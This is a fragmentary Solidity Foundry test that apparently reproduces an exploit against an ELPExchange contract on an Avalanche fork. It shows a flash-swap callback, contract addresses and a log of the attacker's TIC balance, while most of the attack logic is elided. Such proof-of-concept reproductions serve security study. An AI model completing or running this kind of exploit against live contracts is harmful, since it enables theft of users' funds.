...
contract ContractTest is Test {
    ...
    IUniswapV2Pair SPair =
        IUniswapV2Pair(0x4CF9dC05c715812FeAD782DC98de0168029e05C8);
    IUniswapV2Pair JPair =
        IUniswapV2Pair(0xA389f9430876455C36478DeEa9769B7Ca4E3DDB1);
    ELPExchange ELP = ELPExchange(0x4ae1Da57f2d6b2E9a23d07e264Aa2B3bBCaeD19A);

    function setUp() public {
        vm.createSelectFork("Avalanche", 23_563_709);
    }
    ...
    function testExploit() public {
        ...
        emit log_named_decimal_uint(
            "Attacker TIC balance after exploit",
            TIC.balanceOf(address(this)),
            TIC.decimals()
        );
    }
    ...
    function joeCall(
        ...
        // USDC.E swap to TIC
        ELPExchange.InternalBalances memory InternalBalance = ELP
            .internalBalances();
